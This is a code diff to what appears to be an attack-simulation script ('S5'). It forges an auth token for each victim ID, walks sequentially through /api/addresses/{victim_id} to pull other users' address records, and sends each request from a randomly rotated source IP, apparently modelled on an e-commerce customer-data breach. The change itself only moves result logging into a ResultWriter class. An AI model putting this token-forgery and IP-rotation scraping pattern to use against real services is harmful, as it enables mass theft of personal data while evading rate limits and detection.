@@ -42,6 +42,7 @@ from lib.token_forge import forge_token
 from lib.target_pool import get_sequential_pool
 from lib.ip_pool import get_distributed_ips, COUPANG_IP_TO_ACCOUNT_RATIO
 from lib.http_client import get_session, call_api
+from lib.result_writer import ResultWriter
 
 load_dotenv(_ROOT / ".env")
 
@@ -86,50 +87,29 @@ def run_s5(
     print(f"[S5]   interval      : {interval:.3f}s  → eta {eta_min:.1f}min")
     print(f"[S5]   IP 샘플       : {ip_pool[:5]} ...")
 
-    start_time = time.time()
-    request_count = 0
-    success_count = 0
+    writer = ResultWriter("S5")
 
     try:
         for victim_id in victims:
             # IP는 매 요청 random, sub는 순차 단조 증가
             src_ip = rng.choice(ip_pool)
             token = forge_token(victim_id)
+            path = f"/api/addresses/{victim_id}"
 
             try:
-                resp = call_api(
-                    session,
-                    f"/api/addresses/{victim_id}",
-                    token,
-                    src_ip=src_ip,
-                )
-                request_count += 1
-                if resp.status_code == 200:
-                    success_count += 1
-
-                if request_count % 60 == 0:
-                    progress = (request_count / total_requests) * 100
-                    elapsed = (time.time() - start_time) / 60
-                    print(
-                        f"[S5] {progress:5.1f}%  "
-                        f"req={request_count:,}/{total_requests:,}  "
-                        f"ok={success_count:,}  sub={victim_id}  "
-                        f"elapsed={elapsed:.1f}min"
-                    )
+                resp = call_api(session, path, token, src_ip=src_ip)
+                writer.record(victim_id, src_ip, "GET", path, resp)
             except Exception as e:
-                print(f"[S5] error sub={victim_id} ip={src_ip}: {e}")
+                writer.record_error(victim_id, src_ip, path, e)
 
             time.sleep(interval)
     except KeyboardInterrupt:
         print(f"\n[S5] 사용자 중단")
+    finally:
+        writer.close()
 
-    avg_per_ip = request_count / max(1, ip_pool_size)
-    print(
-        f"[S5] 종료 — 총 {request_count:,} 요청, {success_count:,} 성공"
-    )
-    print(
-        f"[S5] 분포 — 계정당 1건(결정론), IP당 평균 {avg_per_ip:.1f}건"
-    )
+    avg_per_ip = writer.total / max(1, ip_pool_size)
+    print(f"[S5] 분포 — 계정당 1건(결정론), IP당 평균 {avg_per_ip:.1f}건")
 
 
 if __name__ == "__main__":
